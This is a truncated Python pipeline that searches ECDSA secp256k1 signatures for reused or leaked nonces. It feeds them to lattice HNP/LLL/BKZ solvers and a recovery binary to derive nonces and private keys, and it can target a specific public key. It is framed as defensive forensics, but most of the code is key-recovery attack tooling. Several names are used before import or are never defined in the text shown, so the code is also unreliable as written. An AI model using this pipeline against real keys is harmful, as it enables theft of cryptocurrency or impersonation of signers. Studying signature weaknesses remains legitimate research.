#!/usr/bin/env python3
"""Risk-aware automation pipeline:
1) Run signature forensics
2) Compute cluster-level nonce-risk (pubkey/script clusters)
3) Execute ecdsa_recover_strict only on suspicious clusters

Default behavior is defensive and reproducible.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import shlex
import subprocess
import sys
from collections import Counter, defaultdict
import importlib.util
import sys as _sys
import os
import multiprocessing as mp


def _flag_provided(argv: list[str], flag: str) -> bool:
    return any(a == flag or a.startswith(flag + "=") for a in argv)


def _detect_mem_gib(default_gib: float = 8.0) -> float:
    try:
        with open("/proc/meminfo", "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("MemTotal:"):
                    parts = line.split()
                    if len(parts) >= 2:
                        kib = int(parts[1])
                        return max(1.0, kib / (1024.0 * 1024.0))
    except Exception:
        pass
    return default_gib


def auto_tune_params(args: argparse.Namespace, argv: list[str], sig_rows: int) -> None:
    cpu = max(1, os.cpu_count() or 1)
    mem_gib = _detect_mem_gib()

    if mem_gib < 4:
        thr_auto = min(2, cpu)
    elif mem_gib < 8:
        thr_auto = min(4, max(1, cpu - 1))
    elif mem_gib < 16:
        thr_auto = min(8, max(1, cpu - 1))
    else:
        thr_auto = min(16, max(1, cpu - 1))

    if mem_gib < 8:
        cluster_min_auto = 40
        cluster_risk_auto = 25
        max_iter_auto = 1
        rk_auto = 0
    elif mem_gib < 16:
        cluster_min_auto = 30
        cluster_risk_auto = 20
        max_iter_auto = 2
        rk_auto = 0
    elif mem_gib < 32:
        cluster_min_auto = 20
        cluster_risk_auto = 15
        max_iter_auto = 2
        rk_auto = 1024
    else:
        cluster_min_auto = 12
        cluster_risk_auto = 10
        max_iter_auto = 3
        rk_auto = 4096

    if sig_rows > 1_000_000:
        cluster_min_auto += 5
    elif sig_rows > 500_000:
        cluster_min_auto += 2

    cluster_budget = int(max(30, min(300, mem_gib * 10)))
    cpu_budget = max(30, cpu * 12)
    max_clusters_auto = min(cluster_budget, cpu_budget)

    if not _flag_provided(argv, "--threads"):
        args.threads = thr_auto
    if not _flag_provided(argv, "--cluster-min-sigs"):
        args.cluster_min_sigs = cluster_min_auto
    if not _flag_provided(argv, "--cluster-risk-threshold"):
        args.cluster_risk_threshold = cluster_risk_auto
    if not _flag_provided(argv, "--max-clusters"):
        args.max_clusters = max_clusters_auto
    if not _flag_provided(argv, "--max-iter"):
        args.max_iter = max_iter_auto
    if not _flag_provided(argv, "--random-k-budget"):
        args.random_k_budget = rk_auto

    print(
        "[auto-tune]",
        f"cpu={cpu}",
        f"mem_gib={mem_gib:.1f}",
        f"sig_rows={sig_rows}",
        f"threads={args.threads}",
        f"cluster_min_sigs={args.cluster_min_sigs}",
        f"cluster_risk_threshold={args.cluster_risk_threshold}",
        f"max_clusters={args.max_clusters}",
        f"max_iter={args.max_iter}",
        f"random_k_budget={args.random_k_budget}",
    )


def _hnp_worker(leaks, q, bits_known, solver_path, qout):
    try:
        spec = importlib.util.spec_from_file_location("hnp_lll_bkz_solver_worker", solver_path)
        hnp_solver = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(hnp_solver)
        result = hnp_solver.recover_private_key(leaks, q, bits_known)
        if isinstance(result, tuple):
            candidates = result[0] if len(result) > 0 else []
        else:
            candidates = result
        all_candidates = []
        if isinstance(candidates, (list, tuple, set)):
            for c in candidates:
                try:
                    d = int(c)
                except Exception:
                    continue
                if d not in all_candidates:
                    all_candidates.append(d)
        try:
            bounded, _bounded_report = hnp_solver.bounded_lsb_recovery(
                leaks,
                q,
                bits_known,
                max_candidates=200_000,
            )
            for c in bounded:
                d = int(c)
                if d not in all_candidates:
                    all_candidates.append(d)
        except Exception:
            pass
        candidates = all_candidates
        if not isinstance(candidates, (list, tuple, set)):
            qout.put(("error", "unexpected_candidates_type"))
            return
        clean = []
        for c in candidates:
            try:
                d = int(c)
            except Exception:
                continue
            # Treat the HNP solver as untrusted until its synthetic regression is
            # consistently green. Only return candidates that satisfy the
            # explicit nonce-bit leakage model on almost every row.
            try:
                verdict = hnp_solver.validate_candidate(d, leaks, q, bits_known)
                if verdict.get("confidence") == "high":
                    clean.append(d)
            except Exception:
                continue
        qout.put(("ok", clean))
    except Exception as e:
        qout.put(("error", str(e)))


def try_hnp_lll_bkz_solver(
    sig_path,
    bits_known=6,
    q=None,
    out_path="hnp_lll_bkz_candidates.txt",
    report_path="hnp_lll_bkz_report.json",
    timeout_sec=120,
    min_leaks=8,
):
    """
    Try to run the HNP/LLL/BKZ solver on a set of signatures with partial nonce leaks.
    Expects sig_path to be a JSONL file with fields r, s, z, and known_nonce_bits (if available).
    """
    solver_path = os.path.join(os.path.dirname(__file__), "hnp_lll_bkz_solver.py")
    report = {
        "input": str(sig_path),
        "output": str(out_path),
        "bits_known": int(bits_known),
        "min_leaks": int(min_leaks),
        "timeout_sec": int(timeout_sec),
        "ran": False,
        "candidates": 0,
    }
    def write_hnp_report(reason: str, **extra: Any) -> None:
        report.update({"reason": reason, **extra})
        try:
            Path(report_path).parent.mkdir(parents=True, exist_ok=True)
            Path(report_path).write_text(json.dumps(report, indent=2), encoding="utf-8")
        except Exception:
            pass

    if not os.path.exists(solver_path):
        print("[HNP/LLL/BKZ] Solver script not found.")
        write_hnp_report("solver_missing")
        return None
    leaks = []
    total_rows = 0
    rows_with_known_nonce_bits = 0
    nonce_bit_keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    with open(sig_path, "r", encoding="utf-8") as f:
        for line in f:
            total_rows += 1
            try:
                obj = json.loads(line.strip())
                known_nonce_raw = None
                for kf in nonce_bit_keys:
                    if kf in obj:
                        known_nonce_raw = obj.get(kf)
                        break
                if known_nonce_raw is None:
                    continue
                r = parse_int(obj.get("r"))
                s = parse_int(obj.get("s"))
                z_raw = obj.get("z")
                if z_raw is None:
                    z_raw = obj.get("m")
                m = parse_int(z_raw)
                known_nonce = parse_int(known_nonce_raw)
                leaks.append((r, s, m, known_nonce))
                rows_with_known_nonce_bits += 1
            except Exception:
                continue
    if not leaks:
        print(
            "[HNP/LLL/BKZ] Skipping: no valid rows with explicit known_nonce_bits "
            f"(rows={total_rows}, with_known_nonce_bits={rows_with_known_nonce_bits})."
        )
        write_hnp_report(
            "no_explicit_nonce_leaks",
            total_rows=total_rows,
            rows_with_known_nonce_bits=rows_with_known_nonce_bits,
            valid_leaks=0,
        )
        return None
    if len(leaks) < int(min_leaks):
        print(
            "[HNP/LLL/BKZ] Skipping: insufficient leakage samples "
            f"(valid_leaks={len(leaks)} < min_leaks={int(min_leaks)})."
        )
        write_hnp_report(
            "insufficient_nonce_leaks",
            total_rows=total_rows,
            rows_with_known_nonce_bits=rows_with_known_nonce_bits,
            valid_leaks=len(leaks),
        )
        return None
    if q is None:
        q = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)
    try:
        import hnp_lll_bkz_solver as hnp_solver  # type: ignore
        report["feasibility"] = hnp_solver.hnp_feasibility(
            sample_count=len(leaks),
            bits_known=int(bits_known),
            q=int(q),
            leakage_model="LSB",
        )
    except Exception:
        report["feasibility"] = {"reason": "unavailable"}

    qout: mp.Queue = mp.Queue()
    proc = mp.get_context("spawn").Process(
        target=_hnp_worker, args=(leaks, int(q), int(bits_known), solver_path, qout)
    )
    proc.start()
    report.update(
        {
            "ran": True,
            "total_rows": total_rows,
            "rows_with_known_nonce_bits": rows_with_known_nonce_bits,
            "valid_leaks": len(leaks),
        }
    )
    proc.join(timeout=float(timeout_sec))
    if proc.is_alive():
        proc.terminate()
        proc.join(5)
        print(f"[HNP/LLL/BKZ] Solver timeout after {timeout_sec}s; continuing pipeline.")
        write_hnp_report("timeout")
        return None
    if proc.exitcode not in (0, None):
        print(f"[HNP/LLL/BKZ] Solver process failed (exit={proc.exitcode}); continuing pipeline.")
        write_hnp_report("process_failed", exitcode=proc.exitcode)
        return None
    if qout.empty():
        print("[HNP/LLL/BKZ] Solver returned no result; continuing pipeline.")
        write_hnp_report("empty_result")
        return None
    status, payload = qout.get()
    if status != "ok":
        print(f"[HNP/LLL/BKZ] Solver execution failed: {payload}")
        write_hnp_report("solver_error", error=str(payload))
        return None
    candidates = payload
    with open(out_path, "w", encoding="utf-8") as fout:
        for c in candidates:
            fout.write(f"{c}\n")
    print(f"[HNP/LLL/BKZ] Candidates written to {out_path}")
    write_hnp_report("ok", candidates=len(candidates))
    return candidates


def run_nonce_hypothesis_generator(args: argparse.Namespace, sig_path: str) -> dict[str, Any]:
    if not args.enable_nonce_hypotheses:
        return {"enabled": False}
    script = Path(__file__).with_name("candidate_hypotheses.py")
    if not script.exists():
        return {"enabled": True, "error": "candidate_hypotheses.py missing"}
    cmd = [
        resolve_python_executable(),
        str(script),
        "--sigs", sig_path,
        "--out", args.nonce_hypothesis_out,
        "--report", args.nonce_hypothesis_report,
        "--models", args.nonce_hypothesis_models,
        "--time-window-sec", str(args.nonce_time_window_sec),
        "--time-step-sec", str(args.nonce_time_step_sec),
        "--counter-max", str(args.nonce_counter_max),
        "--small-k-start", str(args.nonce_small_k_start),
        "--small-k-end", str(args.nonce_small_k_end),
        "--max-candidates", str(args.nonce_max_candidates),
    ]
    if args.target_pubkey:
        cmd += ["--target-pubkey", args.target_pubkey]
    rc = run_cmd(cmd)
    report: dict[str, Any] = {"enabled": True, "rc": rc, "output": args.nonce_hypothesis_out}
    try:
        p = Path(args.nonce_hypothesis_report)
        if p.exists():
            report.update(json.loads(p.read_text(encoding="utf-8")))
    except Exception as e:
        report["report_error"] = str(e)
    return report


def choose_nonce_hypothesis_input(
    *,
    hnp_leaks_path: Path,
    stage0_recoverable_path: Path,
    stage0_path: Path,
    active_sigs_path: Path,
) -> tuple[Path, str]:
    """Pick a non-empty bounded input for weak-nonce hypothesis testing."""
    if hnp_leaks_path.exists() and count_nonempty_lines(hnp_leaks_path) > 0:
        return hnp_leaks_path, "explicit_hnp_leaks"
    if stage0_recoverable_path.exists() and count_nonempty_lines(stage0_recoverable_path) > 0:
        return stage0_recoverable_path, "stage0_recoverable_duplicate_r"
    if stage0_path.exists() and count_nonempty_lines(stage0_path) > 0:
        return stage0_path, "stage0_duplicate_r_focus"
    return active_sigs_path, "active_recovery_input"


def merge_preload_k_files(paths: list[Path], out_path: Path) -> Path | None:
    existing = [p for p in paths if p and p.exists() and count_nonempty_lines(p) > 0]
    if not existing:
        return None
    if len(existing) == 1:
        return existing[0]
    out_path.parent.mkdir(parents=True, exist_ok=True)
    seen = set()
    with out_path.open("w", encoding="utf-8") as out:
        for p in existing:
            with p.open("r", encoding="utf-8", errors="ignore") as src:
                for line in src:
                    raw = line.strip()
                    if not raw or raw in seen:
                        continue
                    seen.add(raw)
                    out.write(raw + "\n")
    return out_path
from pathlib import Path
from typing import Any


def build_or_use_signature_index(
    sig_path: Path,
    db_path: Path,
    build_report_path: Path,
    summary_report_path: Path,
    store_raw: bool = False,
) -> dict[str, Any]:
    """Build/update a local SQLite index and return a metadata-only summary.

    The index is optional acceleration/selection infrastructure. Recovery still
    validates cryptographic candidates in the normal C++ path.
    """
    from signature_sqlite_index import db_report, ingest_jsonl

    report: dict[str, Any] = {
        "enabled": True,
        "db": str(db_path),
        "input": str(sig_path),
        "store_raw": bool(store_raw),
    }
    try:
        build = ingest_jsonl(db_path, sig_path, store_raw=store_raw)
        summary = db_report(db_path)
        build_report_path.parent.mkdir(parents=True, exist_ok=True)
        summary_report_path.parent.mkdir(parents=True, exist_ok=True)
        build_report_path.write_text(json.dumps(build, indent=2, sort_keys=True), encoding="utf-8")
        summary_report_path.write_text(json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8")
        report.update(
            {
                "available": True,
                "build_report": str(build_report_path),
                "summary_report": str(summary_report_path),
                "inserted_rows": build.get("inserted_rows", 0),
                "skipped_duplicate_rows": build.get("skipped_duplicate_rows", 0),
                "total_index_rows": summary.get("total_rows", 0),
                "duplicate_r_groups": summary.get("duplicate_r_groups", 0),
                "recoverable_same_pub_groups": summary.get("recoverable_same_pub_groups", 0),
                "cross_pub_duplicate_r_groups": summary.get("cross_pub_duplicate_r_groups", 0),
            }
        )
    except Exception as e:
        report.update({"available": False, "error": str(e)})
        try:
            build_report_path.parent.mkdir(parents=True, exist_ok=True)
            build_report_path.write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
        except Exception:
            pass
    return report


def build_target_pubkey_subset_indexed(
    db_path: Path,
    target_pubkey: str,
    out_path: Path,
    report_path: Path | None = None,
) -> dict[str, Any]:
    from signature_sqlite_index import extract_target_pubkey

    report = extract_target_pubkey(db_path, target_pubkey, out_path)
    report["indexed"] = True
    if report_path is not None:
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
    return report


def build_duplicate_r_focus_subset_indexed(
    db_path: Path,
    out_path: Path,
    recoverable_out_path: Path,
    replay_out_path: Path,
    report_path: Path,
) -> dict[str, Any]:
    """Indexed duplicate-r extraction with the same shape as JSONL Stage0 info."""
    from signature_sqlite_index import extract_duplicate_r

    all_report = extract_duplicate_r(db_path, out_path, recoverable_only=False)
    recoverable_report = extract_duplicate_r(db_path, recoverable_out_path, recoverable_only=True)

    # Replay rows are evidence-only. With the index fast path we keep replay
    # classification in the report and write an empty replay file rather than
    # spending another extraction pass on data Stage0 will not recover from.
    replay_out_path.parent.mkdir(parents=True, exist_ok=True)
    replay_out_path.write_text("", encoding="utf-8")

    conn = sqlite_connect_readonly(db_path)
    try:
        row = conn.execute(
            """
            SELECT
                COUNT(*) AS duplicate_r_groups,
                SUM(CASE WHEN pubkeys > 1 THEN 1 ELSE 0 END) AS cross_pub_groups
            FROM (
                SELECT r, COUNT(*) AS rows, COUNT(DISTINCT pubkey_hex) AS pubkeys
                FROM signatures
                GROUP BY r
                HAVING COUNT(*) > 1
            )
            """
        ).fetchone()
        exact_replay = conn.execute(
            """
            SELECT COUNT(*) FROM (
                SELECT 1
                FROM signatures
                GROUP BY pubkey_hex, r
                HAVING pubkey_hex != ''
                   AND COUNT(*) > 1
                   AND COUNT(DISTINCT s) = 1
                   AND COUNT(DISTINCT z) = 1
            )
            """
        ).fetchone()[0]
        same_s_diff_z = conn.execute(
            """
            SELECT COUNT(*) FROM (
                SELECT 1
                FROM signatures
                GROUP BY pubkey_hex, r
                HAVING pubkey_hex != ''
                   AND COUNT(*) > 1
                   AND COUNT(DISTINCT s) = 1
                   AND COUNT(DISTINCT z) > 1
            )
            """
        ).fetchone()[0]
        same_r_diff_s = conn.execute(
            """
            SELECT COUNT(*) FROM (
                SELECT 1
                FROM signatures
                GROUP BY pubkey_hex, r
                HAVING pubkey_hex != ''
                   AND COUNT(*) > 1
                   AND COUNT(DISTINCT s) > 1
            )
            """
        ).fetchone()[0]
    finally:
        conn.close()

    duplicate_r_groups = int(row[0] or 0) if row else 0
    cross_pub_groups = int(row[1] or 0) if row else 0
    nontrivial_groups = int(same_s_diff_z or 0) + int(same_r_diff_s or 0)
    selected = int(all_report.get("written_rows", 0) or 0)
    recoverable_selected = int(recoverable_report.get("written_rows", 0) or 0)
    replay_selected = max(0, selected - recoverable_selected)
    info = {
        "indexed": True,
        "db": str(db_path),
        "duplicate_r_groups": duplicate_r_groups,
        "nontrivial_duplicate_r_groups": nontrivial_groups,
        "exact_replay_groups": int(exact_replay or 0),
        "same_r_same_s_diff_z_groups": int(same_s_diff_z or 0),
        "same_r_diff_s_groups": int(same_r_diff_s or 0),
        "cross_pub_duplicate_r_groups": cross_pub_groups,
        "selected_signatures": selected,
        "selected_signatures_nontrivial": recoverable_selected,
        "selected_signatures_recoverable_focus": recoverable_selected,
        "selected_signatures_replay_like": replay_selected,
        "output": str(out_path),
        "recoverable_output": str(recoverable_out_path),
        "replay_output": str(replay_out_path),
        "classification_report": str(report_path),
        "index_extract_reports": {
            "all_duplicate_r": all_report,
            "recoverable_duplicate_r": recoverable_report,
        },
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(info, indent=2, sort_keys=True), encoding="utf-8")
    return info


def sqlite_connect_readonly(db_path: Path) -> sqlite3.Connection:
    import sqlite3

    uri = f"file:{db_path}?mode=ro"
    conn = sqlite3.connect(uri, uri=True)
    conn.row_factory = sqlite3.Row
    return conn


def count_known_nonce_rows(sig_path: Path) -> int:
    keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    count = 0
    with sig_path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except Exception:
                continue
            if isinstance(obj, dict) and any(k in obj for k in keys):
                count += 1
    return count


def build_explicit_hnp_leak_subset(
    *,
    sig_path: Path,
    out_path: Path,
    report_path: Path,
    bits_known: int,
    leakage_model: str = "LSB",
) -> dict[str, Any]:
    """Normalize explicit nonce-leak rows for the HNP solver.

    This does not infer or invent nonce leakage. It only accepts explicit fields
    already present in JSONL rows and writes a standardized local leak file.
    """
    lsb_keys = ("known_nonce_bits", "nonce_lsb", "k_lsb", "known_k_lsb")
    msb_keys = ("nonce_msb", "k_msb", "known_k_msb")
    model = leakage_model.upper()
    accepted_keys = lsb_keys if model == "LSB" else msb_keys
    unsupported_keys = msb_keys if model == "LSB" else lsb_keys
    max_known = 1 << int(bits_known)

    total_rows = 0
    explicit_rows = 0
    valid_rows = 0
    skipped_bad_json = 0
    skipped_missing_core = 0
    skipped_out_of_range = 0
    unsupported_model_rows = 0
    key_counts: Counter[str] = Counter()
    signer_counts: Counter[str] = Counter()
    seen = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                skipped_bad_json += 1
                continue
            if not isinstance(obj, dict):
                skipped_bad_json += 1
                continue

            unsupported_model_rows += int(any(k in obj for k in unsupported_keys))
            leak_key = None
            leak_value_raw = None
            for k in accepted_keys:
                if k in obj:
                    leak_key = k
                    leak_value_raw = obj.get(k)
                    break
            if leak_key is None:
                continue
            explicit_rows += 1
            key_counts[leak_key] += 1

            try:
                r = parse_int(obj.get("r"))
                s = parse_int(obj.get("s"))
                z_raw = obj.get("z")
                if z_raw is None:
                    z_raw = obj.get("m")
                m = parse_int(z_raw)
                known = parse_int(leak_value_raw)
            except Exception:
                skipped_missing_core += 1
                continue
            if not (1 <= r < SECP256K1_N and 1 <= s < SECP256K1_N and 0 <= known < max_known):
                skipped_out_of_range += 1
                continue

            dedup_key = (r, s, m, known)
            if dedup_key in seen:
                continue
            seen.add(dedup_key)
            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            if pub:
                signer_counts[pub] += 1
            out.write(
                json.dumps(
                    {
                        "r": format(r, "064x"),
                        "s": format(s, "064x"),
                        "m": format(m, "064x"),
                        "known_nonce_bits": known,
                        "source_leak_field": leak_key,
                        "pubkey_hex": pub,
                    }
                )
                + "\n"
            )
            valid_rows += 1

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "bits_known": int(bits_known),
        "leakage_model": model,
        "total_rows": total_rows,
        "explicit_leak_rows": explicit_rows,
        "valid_leak_rows": valid_rows,
        "unique_valid_leak_rows": valid_rows,
        "skipped_bad_json_rows": skipped_bad_json,
        "skipped_missing_core_rows": skipped_missing_core,
        "skipped_out_of_range_rows": skipped_out_of_range,
        "unsupported_model_rows": unsupported_model_rows,
        "field_counts": dict(key_counts),
        "unique_signers_with_leaks": len(signer_counts),
        "top_signer_leak_counts": [
            {"pubkey_prefix": pub[:20], "leak_rows": count}
            for pub, count in signer_counts.most_common(20)
        ],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def generate_explicit_leak_k_candidates(
    *,
    leak_path: Path,
    out_path: Path,
    report_path: Path,
    bits_known: int,
    leakage_model: str,
    max_unknown_bits: int,
    max_total_candidates: int,
) -> dict[str, Any]:
    """Generate exact bounded nonce candidates from explicit leak rows.

    This only runs when the remaining unknown nonce space is small enough to be
    exhaustively enumerated. Candidate k values are written to a local preload-k
    artifact; reports contain counts only.
    """
    model = leakage_model.upper()
    q = SECP256K1_N
    bits = int(bits_known)
    max_unknown = max(0, int(max_unknown_bits))
    max_total = max(0, int(max_total_candidates))
    unknown_bits = max(0, q.bit_length() - bits)

    report: dict[str, Any] = {
        "input": str(leak_path),
        "output": str(out_path),
        "bits_known": bits,
        "leakage_model": model,
        "unknown_bits": unknown_bits,
        "max_unknown_bits": max_unknown,
        "max_total_candidates": max_total,
        "enabled": unknown_bits <= max_unknown and max_total > 0,
        "rows_seen": 0,
        "rows_emitted": 0,
        "rows_skipped_too_many_candidates": 0,
        "rows_skipped_bad": 0,
        "total_candidates": 0,
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    if not report["enabled"] or not leak_path.exists():
        reason = "unknown_space_too_large" if unknown_bits > max_unknown else "missing_or_disabled"
        report["reason"] = reason
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
        return report

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with leak_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            report["rows_seen"] = int(report["rows_seen"]) + 1
            try:
                obj = json.loads(raw)
                r_hex = format(parse_int(obj.get("r")), "064x")
                known = parse_int(obj.get("known_nonce_bits"))
            except Exception:
                report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                continue

            candidates: list[str] = []
            if model == "LSB":
                step = 1 << bits
                if known >= step:
                    report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                    continue
                count = ((q - 1 - known) // step) + 1
                if count <= 0:
                    report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                    continue
                if count > (1 << max_unknown):
                    report["rows_skipped_too_many_candidates"] = int(report["rows_skipped_too_many_candidates"]) + 1
                    continue
                if int(report["total_candidates"]) + count > max_total:
                    report["rows_skipped_too_many_candidates"] = int(report["rows_skipped_too_many_candidates"]) + 1
                    continue
                for x in range(int(count)):
                    k = known + step * x
                    if 1 <= k < q:
                        candidates.append(format(k, "064x"))
            else:
                report["rows_skipped_bad"] = int(report["rows_skipped_bad"]) + 1
                continue

            if not candidates:
                continue
            out.write(json.dumps({"r": r_hex, "k_candidates": candidates, "source": "explicit-leak-bounded"}) + "\n")
            report["rows_emitted"] = int(report["rows_emitted"]) + 1
            report["total_candidates"] = int(report["total_candidates"]) + len(candidates)

    report["reason"] = "ok"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report, indent=2), encoding="utf-8")
    return report


def recovery_viability_label(
    *,
    stage0_subset_info: dict[str, Any] | None,
    known_nonce_rows: int,
    min_hnp_leaks: int,
    dup_r: int,
    cross_pub_dup_r: int,
    strong_signal: bool,
    external_candidate_requested: bool,
) -> str:
    """Classify whether the current evidence is recovery-grade or only anomalous."""
    if external_candidate_requested:
        return "external_candidate_validation"
    if stage0_subset_info and int(stage0_subset_info.get("same_r_diff_s_groups", 0) or 0) > 0:
        return "direct_nonce_reuse"
    if known_nonce_rows >= int(min_hnp_leaks):
        return "partial_nonce_leak"
    if cross_pub_dup_r > 0:
        return "cross_pub_duplicate_r_investigate"
    if dup_r > 0:
        return "replay_like_duplicate_r"
    if strong_signal:
        return "weak_anomaly_only"
    return "none"


def resolve_python_executable() -> str:
    """Prefer active virtualenv interpreter when available for subprocess parity."""
    venv = os.environ.get("VIRTUAL_ENV", "").strip()
    if venv:
        cand = Path(venv) / "bin" / "python3"
        if cand.exists() and os.access(cand, os.X_OK):
            return str(cand)
    return sys.executable


def run_cmd(cmd: list[str]) -> int:
    print("$", " ".join(shlex.quote(x) for x in cmd))
    p = subprocess.run(cmd)
    return p.returncode


def write_decision(path: str, payload: dict[str, Any]) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(payload, f, indent=2)


def run_recover_stage(
    recover_bin: str,
    recover_input: str,
    threads: int,
    max_iter: int,
    stage_name: str,
    recover_json_out: str,
    recover_txt_out: str,
    recover_k_out: str,
    recover_deltas_out: str,
    recover_collisions_out: str,
    recover_clusters_out: str,
    extra_args: list[str],
) -> int:
    rec_cmd = [
        recover_bin,
        "--sigs", recover_input,
        "--threads", str(threads),
        "--out-json", recover_json_out,
        "--out-txt", recover_txt_out,
        "--out-k", recover_k_out,
        "--out-deltas", recover_deltas_out,
        "--report-collisions", recover_collisions_out,
        "--export-clusters", recover_clusters_out,
        "--max-iter", str(max_iter),
    ] + extra_args
    print(f"[recover-stage] {stage_name}")
    return run_cmd(rec_cmd)


def build_strong_signal_subset_from_cluster_report(
    sig_path: Path,
    cluster_report_path: Path,
    out_path: Path,
) -> int:
    if not sig_path.exists() or not cluster_report_path.exists():
        return 0
    try:
        crep = json.loads(cluster_report_path.read_text(encoding="utf-8"))
    except Exception:
        return 0
    tops = crep.get("top_clusters", []) or []
    strong_clusters = {
        x.get("cluster")
        for x in tops
        if (
            int(x.get("dup_r_values", 0) or 0) > 0
            or int(x.get("dup_r_events", 0) or 0) > 0
            or int(x.get("fdr_bits_r", 0) or 0) > 0
            or float(x.get("tiny_r_ratio", 0.0) or 0.0) >= 0.01
            or int(x.get("cluster_risk_score_v2", x.get("cluster_risk_score", 0)) or 0) >= int(
                ((crep.get("policy", {}) or {}).get("cluster_risk_threshold", 0) or 0)
            )
        )
    }
    if not strong_clusters:
        return 0

    selected = 0
    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8") as fin, out_path.open("w", encoding="utf-8") as fout:
        for line in fin:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except Exception:
                continue
            key = cluster_key(obj)
            if key in strong_clusters:
                fout.write(raw + "\n")
                selected += 1
    return selected


def parse_int(x: Any) -> int:
    if isinstance(x, int):
        return x
    if isinstance(x, str):
        s = x.strip()
        if not s:
            raise ValueError("empty integer string")
        if s.startswith(("0x", "0X")):
            return int(s, 16)
        # Signature fields are typically hex-encoded fixed-width values (r/s/z).
        # Treat long hex-like strings as hex even when they happen to contain only digits.
        if all(c in "0123456789abcdefABCDEF" for c in s) and len(s) > 20:
            return int(s, 16)
        return int(s, 10)
    raise TypeError(f"Unsupported integer type: {type(x)}")


def count_nonempty_lines(path: Path) -> int:
    if not path.exists():
        return 0
    with path.open("r", encoding="utf-8") as f:
        return sum(1 for line in f if line.strip())


def sha256_file(path: Path) -> str | None:
    if not path.exists():
        return None
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def is_local_recovery_store_path(path_value: str, *, kind: str) -> bool:
    """Best-effort classifier for cumulative local recovery artifacts.

    These artifacts are useful as seeds/preloads, but they should not by
    themselves force expensive broad relation scans after all target evidence is
    already explained.
    """
    if not path_value:
        return False
    name = Path(path_value).name.lower()
    if kind == "k":
        return name in {"recovered_k.jsonl", "recovered-k.jsonl"}
    if kind == "keys":
        return name in {"recovered_keys.jsonl", "recovered-keys.jsonl", "recovered_keys.txt"}
    return False


def build_external_candidate_args(args: argparse.Namespace) -> tuple[list[str], dict[str, Any]]:
    extra: list[str] = []
    report: dict[str, Any] = {
        "enabled": False,
        "preload_k_candidates": None,
        "preload_priv_candidates": None,
    }

    if args.preload_k_candidates:
        p = Path(args.preload_k_candidates)
        if not p.exists():
            print(f"[warn] skipping missing --preload-k-candidates file: {p}")
            report["preload_k_candidates"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-k", str(p)]
            report["enabled"] = True
            report["preload_k_candidates"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    if args.preload_priv_candidates:
        p = Path(args.preload_priv_candidates)
        if not p.exists():
            print(f"[warn] skipping missing --preload-priv-candidates file: {p}")
            report["preload_priv_candidates"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-priv", str(p)]
            report["enabled"] = True
            # Do not inspect or echo candidate private material. Only artifact metadata.
            report["preload_priv_candidates"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    if getattr(args, "preload_recovered_json", ""):
        p = Path(args.preload_recovered_json)
        if not p.exists():
            print(f"[warn] skipping missing --preload-recovered-json file: {p}")
            report["preload_recovered_json"] = {
                "path": str(p),
                "missing": True,
                "rows": 0,
                "sha256": None,
            }
        else:
            extra += ["--preload-recovered", str(p)]
            report["enabled"] = True
            report["preload_recovered_json"] = {
                "path": str(p),
                "rows": count_nonempty_lines(p),
                "sha256": sha256_file(p),
            }

    return extra, report


def structured_relation_args(args: argparse.Namespace) -> list[str]:
    """Bounded nonce-relation scan knobs passed through to ecdsa_recover_strict."""
    return [
        "--bucket-mode", "pub",
        "--dg-max-delta", str(max(0, int(args.delta_max))),
        "--dg-per-pair-cap", str(max(0, int(args.delta_per_pair_cap))),
        "--lcg-a-max", str(max(0, int(args.lcg_a_max))),
        "--lcg-b-max", str(max(0, int(args.lcg_b_max))),
        "--lcg-per-pair-cap", str(max(0, int(args.lcg_per_pair_cap))),
    ]


def write_candidate_validation_report(
    path: Path,
    candidate_report: dict[str, Any],
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
) -> None:
